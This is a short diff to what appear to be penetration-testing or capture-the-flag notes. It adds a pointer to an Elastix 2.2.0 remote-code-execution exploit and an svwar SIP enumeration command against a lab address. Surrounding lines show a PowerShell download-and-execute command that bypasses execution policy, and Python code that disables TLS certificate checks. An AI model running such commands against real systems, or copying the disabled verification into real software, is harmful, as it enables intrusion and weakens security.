@@ -226,4 +226,9 @@ powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadS
 ctx = ssl.create_default_context()  
 ctx.check_hostname = False  
 ctx.verify_mode = ssl.CERT_NONE  
+
+#Elastix 2.2.0 RCE  
+https://www.exploit-db.com/exploits/18650/  
+#find SIP num  
+svwar -m INVITE -e100-300 10.10.10.7  
   
